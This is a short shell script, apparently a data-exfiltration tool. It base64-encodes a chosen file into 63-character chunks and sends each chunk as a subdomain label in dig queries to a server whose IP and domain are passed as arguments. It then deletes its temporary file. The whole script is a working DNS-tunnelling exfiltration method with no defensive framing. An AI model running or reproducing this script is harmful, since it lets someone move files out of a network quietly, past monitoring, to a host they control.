#$1 - the input plain text file
#$2 - the destination server IP
#$3 - the FQDN 
base64 -w 63 $1 > ./.temp1
echo -n 'EOF' >> ./.temp1
while read line; do
	dig @$2 $line.$3;
done < ./.temp1
rm ./.temp1
